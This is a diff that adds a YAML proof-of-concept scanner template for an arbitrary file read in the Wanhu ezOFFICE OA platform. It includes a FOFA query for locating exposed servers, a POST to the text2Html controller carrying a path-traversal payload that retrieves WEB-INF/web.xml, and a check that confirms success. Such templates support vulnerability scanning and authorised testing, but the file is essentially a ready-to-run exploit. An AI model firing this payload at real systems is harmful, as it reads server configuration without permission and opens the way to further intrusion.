@@ -1,0 +1,25 @@
+id: poc-yaml-whir-oa-text2html-anyfile-read
+info:
+  name: 万户OA text2Html 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 万户ezOFFICE协同管理平台
+  fofa: app="ezOFFICE协同管理平台"
+requests:
+- method: POST
+  path: /defaultroot/convertFile/text2Html.controller
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+  expression: 'status_code == 200 &&
+
+    contains(body,"jsp-config") &&
+
+    contains(body,"servlet-name") &&
+
+    contains(body,"java.sun.com")
+
+    '
+variables: {}
+transport: http
